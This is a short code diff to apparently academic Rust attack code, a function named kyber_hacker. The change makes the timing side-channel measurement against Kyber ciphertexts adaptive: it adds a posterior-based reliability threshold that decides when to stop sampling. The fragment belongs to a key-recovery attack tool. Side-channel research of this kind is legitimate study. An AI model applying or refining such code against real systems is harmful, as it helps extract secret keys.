@@ -55,6 +55,7 @@ const MU_0:    f64 = 616.448;
 const SIGMA_0: f64 = 127.052;
 const MU_1:    f64 = 809.774;
 const SIGMA_1: f64 = 102.467;
+const RELIABILITY_THRESHOLD: f64 = 0.2;
 
 const T_MIN: u64 = 450;
 const T_MAX: u64 = 1500;
@@ -534,9 +535,9 @@ fn kyber_hacker(
         write!(ct_received, "\n").unwrap();
         ct_idx += 1;
 
-        let mut times_to_load_test_ptr_atk = Vec::with_capacity(ct_repetitions);
+        let mut times_to_load_test_ptr_atk = vec![];
         let mut measurements_for_this_ct: usize = 0;
-        while times_to_load_test_ptr_atk.len() < ct_repetitions {
+        loop {
             measurements_for_this_ct += 1;
 
             msg_data[0] = !(__trash & MSB_MASK) as u8;
@@ -587,6 +588,13 @@ fn kyber_hacker(
             stream.read_exact(&mut pk).unwrap();
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
+
+            if (times_to_load_test_ptr_atk.len() >= ct_repetitions) {
+                let p0 = posterior_p0(&times_to_load_test_ptr_atk);
+                if abs(0.5 - p0) > (0.5 - RELIABILITY_THRESHOLD) {
+                    break;
+                }
+            }
         }
         total_calls += measurements_for_this_ct;
         let skipped = measurements_for_this_ct - ct_repetitions;
